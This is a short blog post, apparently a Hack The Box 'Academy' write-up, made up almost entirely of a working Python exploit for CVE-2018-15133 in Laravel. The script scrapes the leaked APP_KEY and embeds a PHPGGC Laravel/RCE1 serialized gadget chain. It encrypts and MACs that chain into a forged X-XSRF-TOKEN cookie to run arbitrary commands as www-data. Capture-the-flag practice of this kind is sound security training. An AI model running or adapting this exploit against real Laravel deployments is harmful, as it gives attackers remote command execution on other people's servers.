---
title: Academy RCE
date: 2023-07-24 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Easy, Python Scripting, CVE-2018-15133, Laravel, Deseralization]

img_path: /assets/img/htb/writeups/academy
---

# Python Script

* * *

With the script you gain remote code execution like (www-data) user:

```python
#!/usr/bin/env python3

"""
Academy HTB
------------
Author: Marss
Date: 24 Jul, 2023
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256
import hmac
from json import dumps
from requests import Session, Request
from requests.exceptions import ConnectionError
from re import findall
from signal import signal, SIGINT

# debugging
import pdb

# Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User aborted.')

# (signal)
signal(SIGINT, signal_handler)

# Main Class
class Exploit:

	def __init__(self, args):

		self.args = args
		self.target = 'dev-staging-01.academy.htb'
		self.session = Session()

		# proxies
		#self.proxies = {'http':'127.1:8080'}
		#self.session.proxies.update(self.proxies)

	def run(self):

		try:

			if self.validate_connection():
				APP_KEY = self.get_app_key()
				unserialize_payload = self.get_payload()

				payload_enc = self.encrypt_payload(APP_KEY, unserialize_payload)
				self.send_payload(payload_enc)
				
		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def validate_connection(self) -> bool:

		try:
			req = Request('GET', 'http://' + self.target)
			prepare_req = self.session.prepare_request(req)
			response = self.session.send(prepare_req)
		except ConnectionError:
			exit(f'\n[!] Please add domain "{self.target}" to /etc/hosts or verify connection machine.')
		
		return True

	def get_app_key(self) -> str:

		req = Request('GET', 'http://' + self.target)
		prepare_req = self.session.prepare_request(req)
		response = self.session.send(prepare_req)

		app_key = findall(r'APP_KEY.*\s+(?: .*\n?)"<span .*?>(.*?)</span>', response.text)[0]
		
		return app_key.split(':')[1]

	def get_payload(self) -> str:

		cmd = self.args.cmd
		cmd_len = str(len(self.args.cmd))
		# generated with PHPGCC: https://github.com/ambionics/phpggc 
		# ./phpggc/phpggc Laravel/RCE1 system '<cmd>'
		payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' \
			+ "\x00" + '*' + "\x00" \
			+ 'events";O:15:"Faker\\Generator":1:{s:13:"' \
			+ "\x00" + '*' + "\x00" \
			+ 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' \
			+ "\x00" + '*' + "\x00" \
			+ 'event";s:' + cmd_len + ':"' + cmd + '";}'
		
		return payload

	def encrypt_payload(self, key: str, payload: str) -> str:

		cipher = AES.new(b64decode(key), AES.MODE_CBC)
		laravel_payload_enc = cipher.encrypt(pad(payload.encode('utf-8'), AES.block_size))
		iv = cipher.iv

		mac_hash = hmac.new(
			b64decode(key),
    		b64encode(iv) + b64encode(laravel_payload_enc),
    		sha256).hexdigest()

		laravel_cookie = {
			'iv': b64encode(iv).decode('utf-8'),
			'value': b64encode(laravel_payload_enc).decode('utf-8'),
			'mac': mac_hash
		}

		malicious_cookie = dumps(laravel_cookie)
		malicious_cookie_b64 = b64encode(malicious_cookie.encode('utf-8')).decode('utf-8')

		return malicious_cookie_b64

	def send_payload(self, payload: str) -> str:

		cookies = {'X-XSRF-TOKEN': payload}
		
		req = Request('POST', 'http://' + self.target, cookies=cookies)
		prepare_req = self.session.prepare_request(req)
		response = self.session.send(prepare_req)

		print(findall(r'</html>((?:.*\n?)+)', response.text)[0])

# Main flow
if __name__ == '__main__':

	title = '| Academy RCE (www-data) HTB |'

	parser = ArgumentParser(
		formatter_class=RawDescriptionHelpFormatter,
		epilog='Example:\n\npython3 academy.py -c "id"')

	parser.add_argument('-c', '--cmd', type=str, required=True, help='Execute a command')

	args = parser.parse_args()

	print(title)

	exploit = Exploit(args)
	exploit.run()
```

## PoC

* * *

![PoC](PoC.png){: .shadow}

> Puedes encontrar el script y sus requerimientos en mi repositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Academy)
{: .prompt-info}